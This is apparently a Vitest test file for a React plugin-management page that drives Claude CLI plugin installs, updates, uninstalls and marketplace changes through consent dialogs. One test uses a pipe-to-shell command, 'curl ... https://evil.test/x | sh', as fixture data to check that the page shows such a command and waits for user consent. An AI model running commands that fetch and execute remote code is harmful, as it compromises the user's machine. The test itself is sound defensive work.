// @vitest-environment happy-dom
import { act, createElement } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const runClaudePlugin = vi.hoisted(() => vi.fn());
vi.mock("../model/runClaudePlugin", () => ({ runClaudePlugin }));
const listDir = vi.hoisted(() => vi.fn(async () => []));
vi.mock("../../../platform/tauri/fs", () => ({ listDir }));
vi.mock("../../settings/model/sounds", () => ({ playCue: () => false }));

import {
  fakeClaudePlugin,
  pluginCalls,
} from "../model/__fixtures__/fakeClaudePlugin";
import { __resetPlugins } from "../model/plugins";
import { PluginsPage } from "./PluginsPage";

let container: HTMLDivElement;
let root: Root;

beforeEach(() => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  localStorage.clear();
  runClaudePlugin.mockReset();
  __resetPlugins();
  container = document.createElement("div");
  document.body.append(container);
  root = createRoot(container);
});

afterEach(() => {
  act(() => root.unmount());
  container.remove();
  vi.unstubAllGlobals();
});

const settle = async () => {
  for (let i = 0; i < 10; i++) {
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 0));
    });
  }
};

async function render(cwd = "/repo") {
  await act(async () => {
    root.render(createElement(PluginsPage, { cwd }));
  });
  await settle();
}

function button(text: string, within: ParentNode = container) {
  return Array.from(within.querySelectorAll("button")).find(
    (entry) => entry.textContent?.trim() === text,
  ) as HTMLButtonElement | undefined;
}

async function click(element: Element | null | undefined) {
  expect(element).toBeTruthy();
  await act(async () => (element as HTMLElement).click());
  await settle();
}

async function setValue(
  element: HTMLInputElement | HTMLSelectElement,
  value: string,
) {
  await act(async () => {
    const proto =
      element instanceof HTMLSelectElement
        ? HTMLSelectElement.prototype
        : HTMLInputElement.prototype;
    Object.getOwnPropertyDescriptor(proto, "value")!.set!.call(element, value);
    element.dispatchEvent(
      new Event(element instanceof HTMLSelectElement ? "change" : "input", {
        bubbles: true,
      }),
    );
  });
  await settle();
}

const AVAILABLE = [
  {
    pluginId: "hello@testmk",
    name: "hello",
    marketplaceName: "testmk",
    description: "Says hi",
  },
  { pluginId: "cmdp@cmk", name: "cmdp", marketplaceName: "cmk" },
];

const installs = () =>
  pluginCalls(runClaudePlugin).filter((call) =>
    call.startsWith("plugin install"),
  );

describe("installing a plugin", () => {
  it("installs a plugin a marketplace offers at the user scope", async () => {
    const fake = fakeClaudePlugin(runClaudePlugin, {
      plugins: [],
      available: AVAILABLE,
    });
    await render();
    await click(button("Browse marketplaces"));
    expect(container.textContent).toContain("Says hi");
    await click(button("Install"));
    expect(installs()).toEqual([
      "plugin install --scope user --json hello@testmk",
    ]);
    expect(fake.plugins.map((entry) => entry.id)).toEqual(["hello@testmk"]);
    expect(
      container.querySelector('[data-plugin-row="hello@testmk"]'),
    ).not.toBeNull();
  });

  it("installs into this project from its folder", async () => {
    fakeClaudePlugin(runClaudePlugin, { plugins: [], available: AVAILABLE });
    await render("/Users/me/my repo");
    await click(button("Browse marketplaces"));
    await setValue(
      container.querySelector<HTMLSelectElement>('[aria-label="Install for"]')!,
      "local",
    );
    await click(button("Install"));
    expect(installs()).toEqual([
      "plugin install --scope local --json hello@testmk @ /Users/me/my repo",
    ]);
  });

  it("offers only the user scope when there is no project folder", async () => {
    fakeClaudePlugin(runClaudePlugin, { plugins: [], available: AVAILABLE });
    await render("");
    await click(button("Browse marketplaces"));
    const options = Array.from(
      container.querySelectorAll<HTMLOptionElement>(
        '[aria-label="Install for"] option',
      ),
    );
    expect(
      options.filter((entry) => !entry.disabled).map((o) => o.value),
    ).toEqual(["user"]);
  });

  it("shows a marketplace's install command and runs nothing until it is accepted", async () => {
    const fake = fakeClaudePlugin(runClaudePlugin, {
      plugins: [],
      available: AVAILABLE,
      commandSources: { "cmdp@cmk": "curl -fsSL https://evil.test/x | sh" },
    });
    await render();
    await click(button("Browse marketplaces"));
    await setValue(
      container.querySelector<HTMLSelectElement>(
        '[aria-label="Plugin to install"]',
      )!,
      "cmdp@cmk",
    );
    await click(button("Install"));
    const consent = container.querySelector("[data-plugin-consent]");
    expect(consent?.textContent).toContain(
      "curl -fsSL https://evil.test/x | sh",
    );
    expect(consent?.textContent).toContain("outside any sandbox");
    expect(fake.plugins).toEqual([]);
    expect(installs()).toEqual(["plugin install --scope user --json cmdp@cmk"]);

    await click(button("Cancel", consent!));
    expect(container.querySelector("[data-plugin-consent]")).toBeNull();
    expect(installs()).toHaveLength(1);

    await click(button("Install"));
    await click(button("Run it and install"));
    expect(installs()[2]).toBe(
      `plugin install --scope user --json --accept-command ${"a".repeat(64)} cmdp@cmk`,
    );
    expect(fake.plugins.map((entry) => entry.id)).toEqual(["cmdp@cmk"]);
    expect(pluginCalls(runClaudePlugin).join("\n")).not.toMatch(
      / (-y|--yes)( |$)/m,
    );
  });

  it("says when the marketplaces offer nothing", async () => {
    fakeClaudePlugin(runClaudePlugin, { plugins: [] });
    await render();
    await click(button("Browse marketplaces"));
    expect(container.textContent).toContain("offer nothing");
  });
});

describe("updating and uninstalling", () => {
  it("updates and uninstalls a user plugin, keeping its data unless asked", async () => {
    const fake = fakeClaudePlugin(runClaudePlugin);
    await render();
    const row = () =>
      container.querySelector<HTMLElement>(
        '[data-plugin-row="obsidian@obsidian-skills"]',
      )!;
    await click(button("Update", row()));
    expect(pluginCalls(runClaudePlugin)).toContain(
      "plugin update --scope user --json obsidian@obsidian-skills",
    );
    await click(button("Uninstall", row()));
    const dialog = row().querySelector('[role="alertdialog"]')!;
    expect(dialog.textContent).toContain("Uninstall obsidian");
    expect(
      pluginCalls(runClaudePlugin).some((call) =>
        call.startsWith("plugin uninstall"),
      ),
    ).toBe(false);
    await click(button("Uninstall", dialog));
    expect(pluginCalls(runClaudePlugin)).toContain(
      "plugin uninstall --scope user --json --keep-data obsidian@obsidian-skills",
    );
    expect(
      fake.plugins.some((entry) => entry.id === "obsidian@obsidian-skills"),
    ).toBe(false);
  });

  it("uninstalls a local plugin from its own project's folder, data and all when ticked", async () => {
    fakeClaudePlugin(runClaudePlugin);
    await render();
    const row = container.querySelector<HTMLElement>(
      '[data-plugin-row="stripe@claude-plugins-official"]',
    )!;
    await click(button("Uninstall", row));
    const tick = row.querySelector<HTMLInputElement>('input[type="checkbox"]')!;
    await click(tick);
    await click(
      button("Uninstall", row.querySelector('[role="alertdialog"]')!),
    );
    expect(pluginCalls(runClaudePlugin)).toContain(
      "plugin uninstall --scope local --json stripe@claude-plugins-official @ /Users/me/Projects/resale-platform",
    );
  });

  it("offers no update or uninstall on a claude.ai plugin", async () => {
    fakeClaudePlugin(runClaudePlugin);
    await render();
    const synced = container.querySelector(
      '[data-plugin-row="browser-use@synced"]',
    )!;
    expect(button("Update", synced)).toBeUndefined();
    expect(button("Uninstall", synced)).toBeUndefined();
  });
});

describe("marketplaces", () => {
  it("lists, adds after a warning, updates and removes after a warning", async () => {
    const fake = fakeClaudePlugin(runClaudePlugin, {
      plugins: [],
      marketplaces: [{ name: "testmk", source: "github", repo: "me/testmk" }],
    });
    await render();
    const section = () =>
      container.querySelector<HTMLElement>("[data-plugin-marketplaces]")!;
    expect(section().textContent).toContain("me/testmk");

    await click(button("Update", section()));
    expect(pluginCalls(runClaudePlugin)).toContain(
      "plugin marketplace update --json testmk",
    );

    const input = section().querySelector<HTMLInputElement>(
      '[aria-label="Marketplace source"]',
    )!;
    await setValue(input, "git@github.com:owner/repo.git");
    expect(section().textContent).toContain("Use a GitHub owner/repo");
    expect(button("Add", section())!.disabled).toBe(true);

    await setValue(input, "anthropics/claude-plugins-official");
    await click(button("Add", section()));
    expect(
      pluginCalls(runClaudePlugin).some((call) =>
        call.startsWith("plugin marketplace add"),
      ),
    ).toBe(false);
    expect(section().textContent).toContain("whoever publishes it");
    await click(button("Add it", section()));
    expect(pluginCalls(runClaudePlugin)).toContain(
      "plugin marketplace add --scope user --json anthropics/claude-plugins-official",
    );
    expect(fake.marketplaces.map((entry) => entry.name)).toContain(
      "claude-plugins-official",
    );

    const row = section().querySelector('[data-marketplace="testmk"]')!;
    await click(button("Remove", row));
    expect(row.textContent).toContain("also uninstalls every plugin");
    await click(button("Remove and uninstall", row));
    expect(pluginCalls(runClaudePlugin)).toContain(
      "plugin marketplace remove --json testmk",
    );
    expect(section().querySelector('[data-marketplace="testmk"]')).toBeNull();
  });

  it("shows the CLI's refusal", async () => {
    fakeClaudePlugin(runClaudePlugin, { plugins: [] });
    await render();
    runClaudePlugin.mockImplementationOnce(async () => ({
      stdout:
        '{"command":"marketplace-add","outcome":"failed","message":"Marketplace source blocked by policy","failureCode":"marketplace_policy_blocked"}\n',
      stderr: "",
      success: false,
    }));
    const section = container.querySelector<HTMLElement>(
      "[data-plugin-marketplaces]",
    )!;
    await setValue(
      section.querySelector<HTMLInputElement>(
        '[aria-label="Marketplace source"]',
      )!,
      "owner/repo",
    );
    await click(button("Add", section));
    await click(button("Add it", section));
    expect(section.querySelector('[role="alert"]')?.textContent).toContain(
      "blocked by policy",
    );
  });
});
